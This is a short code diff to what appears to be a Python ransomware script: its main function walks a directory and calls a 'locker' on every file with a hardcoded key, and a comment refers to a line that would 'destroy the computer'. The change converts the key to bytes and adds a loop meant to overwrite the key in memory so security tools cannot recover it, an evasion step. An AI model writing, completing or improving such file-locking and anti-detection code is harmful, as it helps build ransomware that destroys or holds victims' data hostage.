@@ -11,7 +11,7 @@ def main():
     prooblem, because, you already know the *hardcoded_key*
     """
 
-    hardcoded_key = "no please, don't see this"
+    hardcoded_key = b"no please, don't see this"
 
     ###########################################################################
     # Uncomment this line of code below if you want to destroy the computer,
@@ -25,7 +25,11 @@ def main():
     targets = walker(path)
     for target in targets:
         locker(target, hardcoded_key)
-
+    
+    # Remove the hardcoded key from memory to
+    # prevent any security apps to extract it.
+    for _ in range(128):
+        hardcoded_key = os.urandom(32)
 
 if __name__ == '__main__':
     main()
